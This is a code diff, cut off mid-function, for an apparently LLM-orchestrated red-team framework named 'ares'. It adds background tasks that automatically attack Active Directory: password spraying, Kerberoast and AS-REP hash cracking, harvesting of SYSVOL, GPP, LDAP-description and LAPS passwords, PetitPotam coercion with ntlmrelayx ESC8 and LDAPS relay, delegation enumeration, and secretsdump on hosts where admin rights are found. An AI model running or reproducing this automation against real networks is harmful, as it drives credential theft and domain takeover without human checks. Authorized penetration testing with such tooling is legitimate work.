@@ -29,6 +29,7 @@ from ares.core.models import (
     AgentInfo,
     AgentRole,
     Credential,
+    Host,
     InvestigationStage,
     RedTeamState,
     SharedRedTeamState,
@@ -42,8 +43,11 @@ from ares.reports.redteam import RedTeamReportGenerator
 from ares.tools.red import RedTeamReportingTools
 from ares.tools.red.orchestrator import OrchestratorTools
 
-# Default max runtime in seconds (30 minutes), configurable via ARES_MAX_RUNTIME env var
-DEFAULT_MAX_RUNTIME = float(os.environ.get("ARES_MAX_RUNTIME", "1800"))
+# Default max runtime in seconds (60 minutes), configurable via ARES_MAX_RUNTIME env var
+DEFAULT_MAX_RUNTIME = float(os.environ.get("ARES_MAX_RUNTIME", "3600"))
+
+# Grace period for running crack tasks when operation is completing (5 minutes)
+CRACK_TASK_GRACE_PERIOD = float(os.environ.get("ARES_CRACK_GRACE_PERIOD", "300"))
 
 
 def _resolve_model_generator(model: str, openai_api_key: str | None) -> str | rg.Generator:
@@ -162,6 +166,15 @@ async def _load_or_initialize_state(
     )
     if target_domain:
         state.add_domain(target_domain)
+
+    # Add all target IPs as placeholder hosts so scanners can track them
+    # Services will be merged when recon discovers them
+    for ip in target_ips:
+        placeholder_host = Host(ip=ip, hostname="", os="Unknown", roles=[], services=[])
+        state.add_host(placeholder_host)
+    if target_ips:
+        logger.info(f"Added {len(target_ips)} target IPs as placeholder hosts")
+
     if initial_credential:
         state.add_credential(initial_credential, "initial")
         dispatcher.signal_credential_access()
@@ -412,6 +425,14 @@ async def run_multi_agent_operation(  # noqa: PLR0912
         asyncio.create_task(_auto_mssql_detection(dispatcher), name="auto_mssql_detection"),
         asyncio.create_task(_auto_adcs_enumeration(dispatcher), name="auto_adcs_enumeration"),
         asyncio.create_task(_auto_share_spider(dispatcher), name="auto_share_spider"),
+        asyncio.create_task(_auto_bloodhound(dispatcher), name="auto_bloodhound"),
+        asyncio.create_task(_auto_coercion(dispatcher), name="auto_coercion"),
+        asyncio.create_task(
+            _auto_delegation_enumeration(dispatcher), name="auto_delegation_enumeration"
+        ),
+        asyncio.create_task(
+            _auto_local_admin_secretsdump(dispatcher), name="auto_local_admin_secretsdump"
+        ),
     ]
 
     # Build initial prompt for orchestrator
@@ -545,6 +566,8 @@ async def run_multi_agent_operation(  # noqa: PLR0912
 
         if dispatcher.shared_state.completed:
             logger.info("Operation marked complete; skipping post-run wait")
+            # Still wait for running crack tasks to complete
+            await _wait_for_crack_tasks(dispatcher)
         else:
             # Wait for any remaining background tasks
             await _wait_for_completion(dispatcher, tasks, max_runtime=resolved_max_runtime)
@@ -960,8 +983,6 @@ async def _auto_mssql_detection(
         dispatcher: The dispatcher instance
         check_interval: Seconds between MSSQL scans
     """
-    scanned_hosts: set[str] = set()
-
     while True:
         try:
             await asyncio.sleep(check_interval)
@@ -973,19 +994,19 @@ async def _auto_mssql_detection(
                 logger.debug("Operation complete, stopping MSSQL detection")
                 break
 
-            # Check for new hosts we haven't scanned
-            current_hosts = {h.ip for h in state.all_hosts}
-            new_hosts = current_hosts - scanned_hosts
+            # Skip if no hosts discovered yet
+            if not state.all_hosts:
+                logger.debug("MSSQL scanner: no hosts discovered yet")
+                continue
 
-            if new_hosts:
-                logger.debug(f"MSSQL scanner: checking {len(new_hosts)} new host(s)")
-                queued = await dispatcher.scan_hosts_for_mssql()
-                scanned_hosts.update(current_hosts)
+            # Always scan all hosts - dispatcher handles deduplication via already_queued check
+            # This ensures we catch hosts whose services were updated after initial discovery
+            queued = await dispatcher.scan_hosts_for_mssql()
 
-                if queued > 0:
-                    logger.warning(
-                        f"🗄️ Auto-detected MSSQL: queued {queued} vulnerability(ies) for exploitation"
-                    )
+            if queued > 0:
+                logger.warning(
+                    f"🗄️ Auto-detected MSSQL: queued {queued} vulnerability(ies) for exploitation"
+                )
 
         except asyncio.CancelledError:
             break
@@ -997,7 +1018,7 @@ async def _auto_mssql_detection(
 async def _auto_adcs_enumeration(  # noqa: PLR0912
     dispatcher: RedTeamDispatcher,
     check_interval: float = 45.0,
-    max_retries: int = 3,
+    max_retries: int = 2,
 ) -> None:
     """
     Background task that automatically runs ADCS enumeration when:
@@ -1010,12 +1031,14 @@ async def _auto_adcs_enumeration(  # noqa: PLR0912
     Args:
         dispatcher: The dispatcher instance
         check_interval: Seconds between ADCS checks
-        max_retries: Maximum retry attempts per server
+        max_retries: Maximum retry attempts per server (reduced to avoid blocking privesc queue)
     """
     # Track (server, user, domain) -> (task_id, attempt_count, last_attempt_time)
     adcs_attempts: dict[tuple[str, str, str], tuple[str, int, float]] = {}
     successful_servers: set[str] = set()  # Servers with successful enumeration
-    retry_cooldown = 120.0  # Wait 2 minutes before retrying failed tasks
+    failed_servers: set[str] = set()  # Servers that consistently fail - stop retrying
+    retry_cooldown = 60.0  # Wait 1 minute before retrying failed tasks
+    stuck_task_timeout = 480.0  # Consider tasks stuck after 8 minutes
 
     while True:
         try:
@@ -1056,6 +1079,21 @@ async def _auto_adcs_enumeration(  # noqa: PLR0912
                 if server_ip in successful_servers:
                     continue
 
+                # Skip servers that have consistently failed (stop wasting privesc queue time)
+                if server_ip in failed_servers:
+                    continue
+
+                # Count total failures for this server across all credentials
+                server_failure_count = sum(
+                    1 for k, v in adcs_attempts.items() if k[0] == server_ip and v[1] >= max_retries
+                )
+                if server_failure_count >= 2:
+                    logger.warning(
+                        f"⏭️ Auto-ADCS: Skipping {server_ip} - failed with multiple credentials"
+                    )
+                    failed_servers.add(server_ip)
+                    continue
+
                 for cred in state.all_credentials:
                     if not cred.password:
                         continue
@@ -1081,15 +1119,25 @@ async def _auto_adcs_enumeration(  # noqa: PLR0912
                         if current_time - last_attempt < retry_cooldown:
                             continue
 
-                        # Check if task failed (not in pending_tasks means it completed/failed)
-                        if task_id not in state.pending_tasks:
-                            logger.warning(
-                                f"🔄 Auto-ADCS: Retrying {server_ip} with {cred.domain}\\{cred.username} "
-                                f"(attempt {attempt_count + 1}/{max_retries})"
-                            )
-                        else:
-                            # Task still in progress
+                        # Check for stuck tasks (running > 8 minutes without completion)
+                        if task_id in state.pending_tasks:
+                            elapsed = current_time - last_attempt
+                            if elapsed > stuck_task_timeout:
+                                logger.warning(
+                                    f"⏰ Auto-ADCS: Task {task_id} stuck for {elapsed:.0f}s, "
+                                    f"marking {server_ip} as failed"
+                                )
+                                # Increment failure count to skip retries
+                                adcs_attempts[cred_key] = (task_id, max_retries, last_attempt)
+                                continue
+                            # Task still in progress and not stuck yet
                             continue
+
+                        # Task not in pending_tasks means it completed/failed
+                        logger.info(
+                            f"🔄 Auto-ADCS: Retrying {server_ip} with {cred.domain}\\{cred.username} "
+                            f"(attempt {attempt_count + 1}/{max_retries})"
+                        )
                     else:
                         attempt_count = 0
 
@@ -1226,6 +1274,133 @@ async def _auto_share_spider(
             await asyncio.sleep(check_interval)
 
 
+async def _auto_bloodhound(  # noqa: PLR0912
+    dispatcher: RedTeamDispatcher,
+    check_interval: float = 30.0,
+    max_retries: int = 3,
+) -> None:
+    """
+    Background task that automatically runs BloodHound when credentials are discovered.
+
+    BloodHound collection is critical for finding attack paths to Domain Admin.
+    This ensures it runs early once we have valid credentials, without relying
+    on the orchestrator to remember to dispatch it.
+
+    Args:
+        dispatcher: The dispatcher instance
+        check_interval: Seconds between checks for new credentials
+        max_retries: Maximum retry attempts per domain
+    """
+    # Track (domain, username) -> (task_id, attempt_count, last_attempt_time)
+    bloodhound_attempts: dict[tuple[str, str], tuple[str, int, float]] = {}
+    successful_domains: set[str] = set()  # Domains with successful BloodHound
+    retry_cooldown = 120.0  # Wait 2 minutes before retrying failed tasks
+
+    while True:
+        try:
+            await asyncio.sleep(check_interval)
+
+            state = dispatcher.shared_state
+
+            # Skip if operation is complete
+            if state.completed or state.has_domain_admin:
+                logger.debug("Operation complete, stopping BloodHound automation")
+                break
+
+            # Need credentials to run BloodHound
+            if not state.all_credentials:
+                logger.debug("BloodHound scanner: waiting for credentials")
+                continue
+
+            # Get all known domains
+            domains: set[str] = set()
+            if state.target and state.target.domain:
+                domains.add(state.target.domain.lower())
+            for cred in state.all_credentials:
+                if cred.domain:
+                    domains.add(cred.domain.lower())
+
+            if not domains:
+                continue
+
+            current_time = asyncio.get_event_loop().time()
+
+            # Try to run BloodHound for each domain
+            for domain in domains:
+                # Skip domains we've already successfully enumerated
+                if domain.lower() in successful_domains:
+                    continue
+
+                # Find a credential for this domain
+                for cred in state.all_credentials:
+                    if not cred.password:
+                        continue
+
+                    cred_domain = (cred.domain or "").lower()
+                    # Use credentials from same domain, or if no domain try anyway
+                    if cred_domain and cred_domain != domain.lower():
+                        continue
+
+                    cred_key = (domain.lower(), cred.username.lower())
+
+                    # Check if we've already attempted with this credential
+                    if cred_key in bloodhound_attempts:
+                        task_id, attempt_count, last_attempt = bloodhound_attempts[cred_key]
+
+                        # Check if the task completed successfully
+                        task_info = state.pending_tasks.get(task_id)
+                        if task_info and task_info.status == TaskStatus.COMPLETED:
+                            successful_domains.add(domain.lower())
+                            logger.info(f"BloodHound collection succeeded for {domain}")
+                            break
+
+                        # Skip if max retries reached
+                        if attempt_count >= max_retries:
+                            continue
+
+                        # Skip if still in cooldown
+                        if current_time - last_attempt < retry_cooldown:
+                            continue
+
+                        # Check if task failed (not in pending_tasks means it completed/failed)
+                        if task_id not in state.pending_tasks:
+                            logger.info(
+                                f"🔄 Auto-BloodHound: Retrying {domain} with {cred.domain}\\{cred.username} "
+                                f"(attempt {attempt_count + 1}/{max_retries})"
+                            )
+                        else:
+                            # Task still in progress
+                            continue
+                    else:
+                        attempt_count = 0
+
+                    logger.warning(
+                        f"🩸 Auto-BloodHound: Dispatching collection for {domain} "
+                        f"with {cred.domain}\\{cred.username}"
+                    )
+
+                    task_id = await dispatcher.request_recon(
+                        source_agent="orchestrator",
+                        domain=domain,
+                        username=cred.username,
+                        password=cred.password,
+                        reason="bloodhound",
+                        techniques=["bloodhound"],
+                    )
+
+                    if task_id:
+                        bloodhound_attempts[cred_key] = (task_id, attempt_count + 1, current_time)
+                        logger.info(f"BloodHound task {task_id} dispatched for {domain}")
+                        # Only dispatch one task per domain per cycle
+                        break
+
+        except asyncio.CancelledError:
+            break
+        except Exception as e:
+            logger.error(f"BloodHound automation error: {e}", exc_info=True)
+            await asyncio.sleep(check_interval)
+
+
 async def _auto_credential_access(  # noqa: PLR0912
     dispatcher: RedTeamDispatcher,
     check_interval: float = 60.0,
@@ -1242,7 +1417,8 @@ async def _auto_credential_access(  # noqa: PLR0912
     processed_hashes: set[tuple[str, str, str]] = set()
     processed_crack_hashes: set[tuple[str, str, str, str]] = set()
     processed_no_cred_domains: set[str] = set()
-    processed_spray_domains: set[str] = set()  # Domains we've run username_as_password on
+    processed_username_spray_domains: set[str] = set()  # Domains we've run username_as_password on
+    processed_password_spray_domains: set[str] = set()  # Domains we've run password_spray on
     last_user_count: dict[str, int] = {}  # Track user counts per domain to detect new users
 
     while True:
@@ -1315,8 +1491,21 @@ async def _auto_credential_access(  # noqa: PLR0912
                 and not state.all_hashes
                 and any(domain not in processed_no_cred_domains for domain in domains)
             )
+            # Check if any domain has users but hasn't had password spray run yet
+            has_unsprayed_users = any(
+                domain not in processed_password_spray_domains
+                and sum(1 for u in state.all_users if (u.domain or "").lower() == domain.lower())
+                >= 3
+                for domain in domains
+            )
 
-            if not (has_new_creds or has_new_hashes or has_new_cracks or has_new_domains):
+            if not (
+                has_new_creds
+                or has_new_hashes
+                or has_new_cracks
+                or has_new_domains
+                or has_unsprayed_users
+            ):
                 await dispatcher.wait_for_credential_access_signal(check_interval)
                 continue
 
@@ -1347,15 +1536,6 @@ async def _auto_credential_access(  # noqa: PLR0912
             # Check for new users without credentials - run username_as_password on them
             # This catches cases like hodor:hodor where username equals password
             for domain in sorted(domains):
-                if domain in processed_spray_domains:
-                    # Only re-run if we've discovered significantly more users
-                    current_count = sum(
-                        1 for u in state.all_users if (u.domain or "").lower() == domain.lower()
-                    )
-                    prev_count = last_user_count.get(domain.lower(), 0)
-                    if current_count <= prev_count + 5:  # Need at least 5 new users to re-spray
-                        continue
-
                 # Find users in this domain that don't have credentials
                 domain_users = [
                     u.username
@@ -1369,17 +1549,24 @@ async def _auto_credential_access(  # noqa: PLR0912
                 }
                 users_without_creds = [u for u in domain_users if u.lower() not in users_with_creds]
 
-                if len(users_without_creds) >= 3:  # Only spray if we have enough users
-                    domain_hosts = hosts_by_domain.get(domain.lower(), []) or host_ips
+                # Find an existing credential for this domain to use for user enumeration
+                enum_cred = None
+                for c in state.all_credentials:
+                    if (c.domain or "").lower() == domain.lower() and c.password:
+                        enum_cred = c
+                        break
 
-                    # Find an existing credential for this domain to use for user enumeration
-                    # username_as_password needs creds to enumerate users before spraying
-                    enum_cred = None
-                    for c in state.all_credentials:
-                        if (c.domain or "").lower() == domain.lower() and c.password:
-                            enum_cred = c
-                            break
+                domain_hosts = hosts_by_domain.get(domain.lower(), []) or host_ips
 
+                # Run username_as_password if we have enough users and haven't done it yet
+                should_run_username_spray = domain not in processed_username_spray_domains
+                if domain in processed_username_spray_domains:
+                    # Re-run if we've discovered significantly more users
+                    current_count = len(domain_users)
+                    prev_count = last_user_count.get(domain.lower(), 0)
+                    should_run_username_spray = current_count > prev_count + 5
+
+                if should_run_username_spray and len(users_without_creds) >= 3:
                     task_id = await dispatcher.request_credential_access(
                         source_agent="orchestrator",
                         domain=domain,
@@ -1390,7 +1577,7 @@ async def _auto_credential_access(  # noqa: PLR0912
                         techniques=["username_as_password"],
                     )
                     if task_id:
-                        processed_spray_domains.add(domain)
+                        processed_username_spray_domains.add(domain)
                         last_user_count[domain.lower()] = len(domain_users)
                         logger.info(
                             "Auto username_as_password dispatched for %d users without creds in %s (using %s for enum)",
@@ -1399,6 +1586,26 @@ async def _auto_credential_access(  # noqa: PLR0912
                             f"{enum_cred.domain}\\{enum_cred.username}"
                             if enum_cred
                             else "null session",
+                        )
+
+                # Run password_spray with common passwords if we have users and haven't done it
+                # This is separate from username_as_password - we spray common passwords
+                if domain not in processed_password_spray_domains and len(domain_users) >= 3:
+                    task_id = await dispatcher.request_credential_access(
+                        source_agent="orchestrator",
+                        domain=domain,
+                        target_ips=domain_hosts,
+                        username=enum_cred.username if enum_cred else "",
+                        password=enum_cred.password if enum_cred else None,
+                        reason="low_hanging_fruit_password_spray",
+                        techniques=["password_spray"],
+                    )
+                    if task_id:
+                        processed_password_spray_domains.add(domain)
+                        logger.info(
+                            "Auto password_spray dispatched for %d users in %s",
+                            len(domain_users),
+                            domain,
                         )
 
             for cred in state.all_credentials:
@@ -1417,8 +1624,10 @@ async def _auto_credential_access(  # noqa: PLR0912
                     reason="new_credential",
                     techniques=["kerberoast", "secretsdump", "lsassy"],
                 )
-                # Also dispatch SYSVOL/GPP search separately (only needs DC targets)
-                # This is high-value low-hanging fruit that often contains hardcoded creds
+                # Also dispatch FAST credential discovery separately (only needs DC targets)
+                # These are high-value low-hanging fruit that take ~2-5 seconds each
+                # Running them separately ensures they complete quickly without getting
+                # blocked by slow recon (smb_sweep) or credential dumping (secretsdump)
                 dc_hosts = [
                     h
                     for h in domain_hosts
@@ -1436,8 +1645,13 @@ async def _auto_credential_access(  # noqa: PLR0912
                     username=cred.username,
                     password=cred.password,
                     credential_source=cred.source,
-                    reason="sysvol_gpp_search",
-                    techniques=["sysvol_script_search", "gpp_password_finder"],
+                    reason="fast_credential_discovery",
+                    techniques=[
+                        "sysvol_script_search",  # ~2 sec, hardcoded passwords in SYSVOL
+                        "gpp_password_finder",  # ~2 sec, GPP/cpassword credentials
+                        "ldap_search_descriptions",  # ~3 sec, passwords in user descriptions
+                        "laps_dump",  # ~2 sec, LAPS local admin passwords
+                    ],
                 )
                 if task_id:
                     processed_creds.add(key)
@@ -1496,20 +1710,43 @@ async def _auto_credential_access(  # noqa: PLR0912
                     continue
                 if crack_key in processed_crack_hashes:
                     continue
+
+                # Determine priority based on hash type
+                # Kerberoast hashes have higher priority - service accounts often have weak passwords
+                # AS-REP hashes also get boosted priority
+                crack_priority = 5  # Default priority
+                hash_value_lower = hash_obj.hash_value.lower()
+                hash_type_upper = (hash_obj.hash_type or "").upper()
+
+                if "$krb5tgs$" in hash_value_lower or "KERBEROAST" in hash_type_upper:
+                    crack_priority = 2  # High priority - service accounts often weak
+                    logger.info(
+                        f"Kerberoast hash detected for {hash_obj.domain}\\{hash_obj.username}, "
+                        f"boosting crack priority to {crack_priority}"
+                    )
+                elif "$krb5asrep$" in hash_value_lower or "ASREP" in hash_type_upper:
+                    crack_priority = 3  # Medium-high priority
+                    logger.info(
+                        f"AS-REP hash detected for {hash_obj.domain}\\{hash_obj.username}, "
+                        f"boosting crack priority to {crack_priority}"
+                    )
+
                 crack_task_id = await dispatcher.request_crack(
                     hash_value=hash_obj.hash_value,
                     hash_type=hash_obj.hash_type,
                     source_agent="orchestrator",
                     username=hash_obj.username,
                     domain=hash_obj.domain,
+                    priority=crack_priority,
                 )
                 if crack_task_id:
                     processed_crack_hashes.add(crack_key)
                     logger.info(
-                        "Auto crack dispatched for {}\\{} ({})",
+                        "Auto crack dispatched for {}\\{} ({}, priority={})",
                         hash_obj.domain or "(unknown)",
                         hash_obj.username,
                         hash_obj.hash_type or "unknown",
+                        crack_priority,
                     )
 
         except asyncio.CancelledError:
@@ -1517,6 +1754,564 @@ async def _auto_credential_access(  # noqa: PLR0912
         except Exception as e:
             logger.error(f"Auto credential access error: {e}", exc_info=True)
             await asyncio.sleep(check_interval)
+
+
+async def _auto_coercion(  # noqa: PLR0912
+    dispatcher: RedTeamDispatcher,
+    check_interval: float = 60.0,
+) -> None:
+    """
+    Background task that automatically triggers coercion attacks when conditions are met.
+
+    Monitors for:
+    1. ADCS servers with web enrollment → ESC8 relay attacks (ntlmrelayx + petitpotam)
+    2. Domain controllers → petitpotam/coercer coercion for credential relay
+    3. Writable shares → potential for file-based coercion (.lnk/.scf drops)
+
+    This automates the coercion workflow that attackers would normally coordinate manually.
+
+    Args:
+        dispatcher: The dispatcher instance
+        check_interval: Seconds between coercion checks
+    """
+    # Track what we've already triggered to avoid duplicates
+    esc8_attempted_servers: set[str] = set()  # ADCS servers we've started ESC8 against
+    coerced_dcs: set[str] = set()  # DCs we've attempted to coerce
+    writable_share_targets: set[tuple[str, str]] = set()  # (host, share) combos notified
+
+    while True:
+        try:
+            await asyncio.sleep(check_interval)
+
+            state = dispatcher.shared_state
+
+            # Skip if operation is complete
+            if state.completed or state.has_domain_admin:
+                logger.debug("Operation complete, stopping auto coercion")
+                break
+
+            # Need at least some credentials to make coercion worthwhile
+            # (captured hashes need to be relayed or cracked)
+            if not state.all_credentials and not state.all_hashes:
+                logger.debug("Auto coercion: waiting for credentials before starting coercion")
+                continue
+
+            # Helper function to detect Domain Controllers
+            def _is_dc(host: Host) -> bool:
+                """Check if host is a Domain Controller.
+
+                Detection methods:
+                1. Explicit DC roles (from SRV lookup or BloodHound)
+                2. DC services (Kerberos 88, LDAP 389)
+                3. Hostname contains "dc"
+                """
+                # Check explicit roles (from SRV lookup, BloodHound, or manual tagging)
+                if any(
+                    r.lower() in ("dc", "domain controller", "domaincontroller", "ad dc")
+                    for r in (host.roles or [])
+                ):
+                    return True
+                # Check DC-like services (Kerberos, LDAP)
+                for svc in host.services or []:
+                    svc_lower = svc.lower()
+                    if svc_lower.startswith(("88/tcp", "389/tcp")):
+                        return True
+                    if "kerberos" in svc_lower or "ldap" in svc_lower:
+                        return True
+                # Check if hostname contains "dc"
+                return "dc" in (host.hostname or "").lower()
+
+            # === ESC8 RELAY ATTACK ===
+            # When ADCS servers with web enrollment are detected, start ntlmrelayx + petitpotam
+            adcs_servers = dispatcher.find_adcs_servers()
+            for server_ip, server_hostname in adcs_servers:
+                if server_ip in esc8_attempted_servers:
+                    continue
+
+                # Find a DC to coerce for ESC8 (DCs authenticating to ADCS = domain admin cert)
+                dcs = [
+                    h
+                    for h in state.all_hosts
+                    if _is_dc(h) and h.ip != server_ip  # Don't coerce the ADCS server to itself
+                ]
+
+                if not dcs:
+                    logger.debug(f"Auto coercion: ADCS {server_ip} found but no DCs to coerce yet")
+                    continue
+
+                # Pick the first available DC
+                target_dc = dcs[0]
+
+                # Dispatch ESC8 coercion task
+                # This will start ntlmrelayx to ADCS and coerce the DC
+                task_id = await dispatcher.request_coercion(
+                    source_agent="orchestrator",
+                    techniques=["petitpotam", "coercer"],
+                    payload_override={
+                        "attack_type": "esc8",
+                        "adcs_server": server_ip,
+                        "adcs_hostname": server_hostname,
+                        "coerce_target": target_dc.ip,
+                        "coerce_hostname": target_dc.hostname,
+                        "note": (
+                            f"ESC8 RELAY ATTACK: Start ntlmrelayx targeting "
+                            f"http://{server_hostname or server_ip}/certsrv/ with template "
+                            f"DomainController, then coerce {target_dc.hostname or target_dc.ip} "
+                            f"with petitpotam to get DC certificate for domain admin."
+                        ),
+                    },
+                )
+
+                if task_id:
+                    esc8_attempted_servers.add(server_ip)
+                    logger.warning(
+                        f"🎯 Auto ESC8 coercion dispatched: relay to ADCS {server_hostname or server_ip}, "
+                        f"coerce DC {target_dc.hostname or target_dc.ip} (task {task_id})"
+                    )
+
+            # === DC COERCION FOR LDAPS RELAY ===
+            # Even without ADCS, coercing DCs to an LDAPS relay can grant RBCD/shadow creds
+            for host in state.all_hosts:
+                # Reuse the _is_dc function defined above for ESC8
+                if not _is_dc(host) or host.ip in coerced_dcs:
+                    continue
+
+                # Only coerce if we have credentials to authenticate the relay
+                if not state.all_credentials:
+                    continue
+
+                # Dispatch LDAPS relay coercion
+                task_id = await dispatcher.request_coercion(
+                    source_agent="orchestrator",
+                    techniques=["petitpotam", "coercer"],
+                    payload_override={
+                        "attack_type": "ldaps_relay",
+                        "coerce_target": host.ip,
+                        "coerce_hostname": host.hostname,
+                        "relay_target": host.ip,  # Relay to same DC's LDAPS
+                        "note": (
+                            f"LDAPS RELAY: Start ntlmrelayx targeting ldaps://{host.ip} with "
+                            f"--delegate-access, then coerce {host.hostname or host.ip} with "
+                            f"petitpotam to create machine account for RBCD attack."
+                        ),
+                    },
+                )
+
+                if task_id:
+                    coerced_dcs.add(host.ip)
+                    logger.warning(
+                        f"🎯 Auto LDAPS relay coercion dispatched: coerce DC {host.hostname or host.ip} "
+                        f"for RBCD (task {task_id})"
+                    )
+                    # Only do one DC at a time to avoid overwhelming the coercion agent
+                    break
+
+            # === WRITABLE SHARE NOTIFICATION ===
+            # Log writable shares that could be used for file-based coercion (.lnk/.scf drops)
+            # Note: slinky module not currently available, but we flag the opportunity
+            for share in state.all_shares:
+                perms = (share.permissions or "").upper()
+                if "WRITE" not in perms:
+                    continue
+
+                share_key = (share.host.lower(), share.name.lower())
+                if share_key in writable_share_targets:
+                    continue
+
+                # Skip admin shares
+                if share.name.lower() in ("admin$", "c$", "d$", "e$", "ipc$"):
+                    continue
+
+                writable_share_targets.add(share_key)
+                logger.info(
+                    f"📁 Writable share detected: {share.host}/{share.name} ({perms}) - "
+                    f"potential target for file-based coercion (.lnk/.scf drop)"
+                )
+
+        except asyncio.CancelledError:
+            break
+        except Exception as e:
+            logger.error(f"Auto coercion error: {e}", exc_info=True)
+            await asyncio.sleep(check_interval)
+
+
+async def _auto_delegation_enumeration(  # noqa: PLR0912
+    dispatcher: RedTeamDispatcher,
+    check_interval: float = 60.0,
+) -> None:
+    """
+    Background task that automatically runs delegation enumeration for discovered credentials.
+
+    When credentials are discovered, dispatches find_delegation tasks to enumerate:
+    - Unconstrained delegation (machines that can impersonate any user)
+    - Constrained delegation (machines that can impersonate to specific services)
+
+    These are high-value targets for privilege escalation.
+
+    Args:
+        dispatcher: The dispatcher instance
+        check_interval: Seconds between checks for new credentials
+    """
+    # Track credentials that have completed successfully - only these won't be retried
+    processed_creds: set[tuple[str, str]] = set()
+    # Track dispatched tasks: task_id -> cred_key (for checking completion status)
+    dispatched_tasks: dict[str, tuple[str, str]] = {}
+
+    while True:
+        try:
+            await asyncio.sleep(check_interval)
+
+            state = dispatcher.shared_state
+
+            # Skip if operation is complete
+            if state.completed or state.has_domain_admin:
+                logger.debug("Operation complete, stopping delegation enumeration")
+                break
+
+            # Check for completed/failed tasks and update processed_creds accordingly
+            completed_task_ids = list(dispatched_tasks.keys())
+            for task_id in completed_task_ids:
+                cred_key = dispatched_tasks[task_id]
+
+                # Check if task is still pending (running)
+                if task_id in state.pending_tasks:
+                    continue  # Still running, check later
+
+                # Task finished - check if it succeeded or failed
+                task_result = state.completed_tasks.get(task_id)
+                if task_result:
+                    # Remove from dispatched regardless of outcome
+                    del dispatched_tasks[task_id]
+
+                    if task_result.success:
+                        # Task succeeded - mark credential as processed (won't retry)
+                        processed_creds.add(cred_key)
+                        logger.info(
+                            f"✅ Auto-delegation task {task_id} succeeded for "
+                            f"{cred_key[0]}\\{cred_key[1]}"
+                        )
+                    else:
+                        # Task failed - DON'T add to processed_creds so it can be retried
+                        logger.warning(
+                            f"❌ Auto-delegation task {task_id} failed for "
+                            f"{cred_key[0]}\\{cred_key[1]}: {task_result.error}. "
+                            f"Will retry on next cycle."
+                        )
+                else:
+                    # Task not in pending or completed - probably lost, allow retry
+                    logger.warning(
+                        f"⚠️ Auto-delegation task {task_id} missing for "
+                        f"{cred_key[0]}\\{cred_key[1]}, allowing retry"
+                    )
+                    del dispatched_tasks[task_id]
+
+            # Need credentials to enumerate delegation
+            if not state.all_credentials:
+                logger.debug("Auto-delegation: waiting for credentials")
+                continue
+
+            # Find new credentials with passwords
+            for cred in state.all_credentials:
+                if not cred.password:
+                    continue
+
+                cred_key = ((cred.domain or "").lower(), cred.username.lower())
+
+                # Skip if already processed successfully
+                if cred_key in processed_creds:
+                    continue
+
+                # Skip if currently dispatched (task in flight)
+                if cred_key in dispatched_tasks.values():
+                    continue
+
+                # Get domain for this credential
+                domain = cred.domain or (state.target.domain if state.target else "")
+                if not domain:
+                    continue
+
+                # Dispatch delegation enumeration to PRIVESC agent (has DelegationTools)
+                logger.info(
+                    f"🔍 Auto-delegation: Running find_delegation for {cred.domain}\\{cred.username}"
+                )
+
+                task_id = await dispatcher.request_privesc_enumeration(
+                    source_agent="orchestrator",
+                    domain=domain,
+                    username=cred.username,
+                    password=cred.password,
+                    techniques=["find_delegation"],
+                )
+
+                if task_id:
+                    # Track as dispatched - will be marked processed only on success
+                    dispatched_tasks[task_id] = cred_key
+                    logger.info(
+                        f"Auto-delegation task {task_id} dispatched for {cred.domain}\\{cred.username}"
+                    )
+
+        except asyncio.CancelledError:
+            break
+        except Exception as e:
+            logger.error(f"Auto delegation enumeration error: {e}", exc_info=True)
+            await asyncio.sleep(check_interval)
+
+
+async def _auto_local_admin_secretsdump(  # noqa: PLR0912
+    dispatcher: RedTeamDispatcher,
+    check_interval: float = 45.0,
+) -> None:
+    """
+    Background task that automatically runs secretsdump when local admin access is detected.
+
+    When BloodHound or CME identifies that a user has local admin rights on a host,
+    this workflow automatically dispatches secretsdump to harvest credentials.
+
+    This catches scenarios like:
+    - User is member of local Administrators group
+    - User has AdminTo relationship in BloodHound
+    - CME reports "Pwn3d!" for a credential/host combination
+
+    Args:
+        dispatcher: The dispatcher instance
+        check_interval: Seconds between checks for admin access opportunities
+    """
+    # Track (host_ip, cred_key) -> task_id for deduplication
+    secretsdump_attempts: dict[tuple[str, str, str], str] = {}
+    successful_hosts: set[str] = set()  # Hosts where secretsdump succeeded
+    failed_attempts: dict[tuple[str, str, str], int] = {}  # Track failures for retry limiting
+    max_retries = 2
+
+    while True:
+        try:
+            await asyncio.sleep(check_interval)
+
+            state = dispatcher.shared_state
+
+            # Skip if operation is complete
+            if state.completed or state.has_domain_admin:
+                logger.debug("Operation complete, stopping auto local admin secretsdump")
+                break
+
+            # Check completed tasks to update tracking
+            for key, task_id in list(secretsdump_attempts.items()):
+                host_ip, username, domain = key
+
+                # Check if task completed
+                if task_id not in state.pending_tasks:
+                    task_result = state.completed_tasks.get(task_id)
+                    if task_result and task_result.success:
+                        successful_hosts.add(host_ip)
+                        logger.info(
+                            f"✅ Auto-secretsdump succeeded on {host_ip} with {domain}\\{username}"
+                        )
+                    elif task_result and not task_result.success:
+                        failed_attempts[key] = failed_attempts.get(key, 0) + 1
+                        logger.warning(
+                            f"❌ Auto-secretsdump failed on {host_ip} with {domain}\\{username}: "
+                            f"{task_result.error} (attempt {failed_attempts[key]}/{max_retries})"
+                        )
+                    del secretsdump_attempts[key]
+
+            # Find credentials marked as admin
+            admin_creds = [c for c in state.all_credentials if c.is_admin and c.password]
+
+            if not admin_creds:
+                logger.debug("Auto-secretsdump: no admin credentials found yet")
+                continue
+
+            # For each admin credential, try to run secretsdump on relevant hosts
+            for cred in admin_creds:
+                cred_domain = cred.domain or ""
+
+                # Find hosts in the same domain or hosts where this cred was marked admin
+                target_hosts = []
+                for host in state.all_hosts:
+                    # Skip already successful hosts
+                    if host.ip in successful_hosts:
+                        continue
+
+                    # Skip hosts without IP
+                    if not host.ip:
+                        continue
+
+                    # Check if credential source mentions this host (e.g., "Pwn3d! on 192.168.58.10")
+                    source_lower = cred.source.lower()
+                    if host.ip in source_lower or (
+                        host.hostname and host.hostname.lower() in source_lower
+                    ):
+                        target_hosts.append(host)
+                        continue
+
+                    # Check if host is a DC for the credential's domain (high value target)
+                    if host.is_dc and cred_domain:
+                        hostname_lower = (host.hostname or "").lower()
+                        if cred_domain.lower() in hostname_lower:
+                            target_hosts.append(host)
+
+                for host in target_hosts:
+                    key = (host.ip, cred.username.lower(), cred_domain.lower())
+
+                    # Skip if already attempted and in-flight
+                    if key in secretsdump_attempts:
+                        continue
+
+                    # Skip if max retries reached
+                    if failed_attempts.get(key, 0) >= max_retries:
+                        continue
+
+                    # Dispatch secretsdump task
+                    logger.warning(
